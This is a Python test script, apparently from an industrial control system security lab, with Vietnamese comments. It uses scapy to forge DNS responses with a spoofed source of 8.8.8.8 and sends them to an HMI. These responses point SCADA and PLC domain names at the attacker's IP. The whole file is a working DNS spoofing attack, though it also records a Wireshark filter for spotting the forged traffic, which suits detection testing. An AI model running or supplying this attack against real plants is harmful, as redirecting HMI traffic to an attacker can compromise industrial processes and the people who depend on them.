#!/usr/bin/env python3
"""
tests/test_dns_spoof.py
Gui DNS response gia huong HMI den IP attacker. Can chay voi sudo.

Chay: sudo python tests/test_dns_spoof.py
"""

import sys
import os
import time
import socket

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

SPOOF_DOMAINS = [
    "opcserver.local",
    "plc-controller",
    "scada-server.local",
]


def main():
    print(f"\n{B}[TEST] DNS_SPOOF_ICS{X}")

    if os.name != "nt" and os.geteuid() != 0:
        fail("Can chay voi sudo!")
        print(f"  Chay lai: {Y}sudo python tests/test_dns_spoof.py{X}")
        return

    info(f"Target HMI: {HMI_IP}  Interface: {IFACE}")
    info("PLC KHONG thay doi — dau vet la DNS response tu IP la")

    changes = []
    observable = []
    notes = []
    error = None
    success = False
    t0 = time.time()

    try:
        from scapy.all import DNS, DNSRR, IP, UDP, send, conf

        conf.verb = 0

        attacker_ip = socket.gethostbyname(socket.gethostname())
        info(f"Attacker IP: {attacker_ip}")

        print(f"\n  {'Domain':<30} {'Fake IP':<18} Ket qua")
        print(f"  {'-'*55}")

        sent = 0
        for domain in SPOOF_DOMAINS:
            pkt = (
                IP(src="8.8.8.8", dst=HMI_IP) /
                UDP(sport=53, dport=5353) /
                DNS(
                    id=0xABCD,
                    qr=1,
                    aa=1,
                    an=DNSRR(rrname=f"{domain}.", ttl=60, rdata=attacker_ip),
                )
            )
            send(pkt, iface=IFACE)
            print(f"  {domain:<30} {attacker_ip:<18} {G}Da gui{X}")
            sent += 1
            time.sleep(0.5)

        observable.append(f"DNS response tu 8.8.8.8 (gia) den {HMI_IP}")
        observable.append(f"Gui {sent} fake DNS records")
        notes.append("Wireshark: dns.flags.response==1 && ip.src!=<DNS_SERVER>")
        notes.append(f"Neu HMI resolve domain -> ket noi den {attacker_ip} thay vi server that")
        success = sent > 0

    except ImportError:
        error = "scapy chua cai: pip install scapy"
        fail(error)
    except Exception as e:
        error = str(e)
        fail(str(e))

    print_result("DNS_SPOOF_ICS", success, changes, observable, notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
